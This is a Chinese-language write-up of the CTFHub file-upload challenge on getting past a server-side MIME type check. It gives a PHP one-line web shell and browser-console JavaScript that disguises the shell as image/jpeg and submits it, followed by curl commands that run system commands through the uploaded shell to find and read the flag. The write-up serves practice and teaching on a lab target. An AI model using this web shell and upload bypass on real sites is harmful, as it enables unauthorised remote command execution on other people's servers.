---
title: CTFHub-文件上传-MIME绕过 Writeup
date: 2026-10-23
category: web
tags: [CTFHub, 文件上传, web]
---
## 题目分析
本关卡针对文件上传进行了 MIME 类型校验，服务器端仅允许上传 `image/jpeg`、`image/png` 等图片类型。通过查看网页源码，前端未见明显校验，说明拦截点在服务器端。由于 MIME 类型（即 HTTP 请求头中的 `Content-Type`）是客户端可控的信息，修改请求头即可绕过。
## 绕过过程与踩坑记录
在尝试绕过时遇到了一些阻碍：
*   **直接抓包修改失败**：使用开发者工具（F12）的“网络”面板直接双击修改 `Content-Type` 无法生效，尝试右键“编辑并重发”修改后，服务器依然返回 `alert('文件类型不正确')`。
*   **CMD 发包失败**：使用 `curl -F "file=@shell.php;type=image/jpeg"` 直接向根目录发包，由于缺少某些原生表单的上下文或请求头，服务器并未处理文件流，而是直接返回了首页的 HTML 源码。
*   **前端校验拦截**：直接上传 `shell.php` 会触发前端拦截。
## 终极绕过方式：控制台注入（Fetch + DataTransfer）
为了彻底绕过前端限制并伪造完美的 MIME 类型，最终采用了在浏览器控制台利用 JavaScript 强行构造文件并提交的方式。

**操作步骤：**
1. 准备一句话木马，内容为：`<?php @eval($_POST['pass']);?>`。
2. 在靶场页面按 `F12` 打开开发者工具，切换到 **“控制台 (Console)”**。
3. 注入以下代码，强行创建一个类型为 `image/jpeg` 的 PHP 文件，并将其注入到页面的表单中自动提交：

javascript
// 1. 伪造一个 MIME 类型为 image/jpeg 的木马文件
let blob = new Blob(["<?php @eval($_POST['pass']);?>"], {type: 'image/jpeg'});
let file = new File([blob], "shell.php", {type: 'image/jpeg'});

// 2. 利用 DataTransfer 强行塞入页面的文件输入框
let dataTransfer = new DataTransfer();
dataTransfer.items.add(file);
document.querySelector('input[type="file"]').files = dataTransfer.files;

// 3. 延时自动点击提交，绕过手动点击可能触发的检查
setTimeout(() => {
    document.querySelector('input[type="submit"]').click();
}, 500);
// 4.代码执行后，页面自动提交，成功将木马以 image/jpeg 的伪装身份上传至服务器。

## 获取 Flag
文件上传成功后，继续使用 curl 命令行直接连接服务器执行命令：
### 验证木马：
curl -X POST "http://靶场域名/upload/shell.php" -d "pass=system('ls');"
### 查找 Flag 文件：
curl -X POST "http://靶场域名/upload/shell.php" -d "pass=system('find / -name *flag*');"
### 读取 Flag：
curl -X POST "http://靶场域名/upload/shell.php" -d "pass=system('cat /var/www/html/flag_1216325461.php');"

## 最终结果
成功获取 Flag：ctfhub{b97db65e42d811d21e53da52}
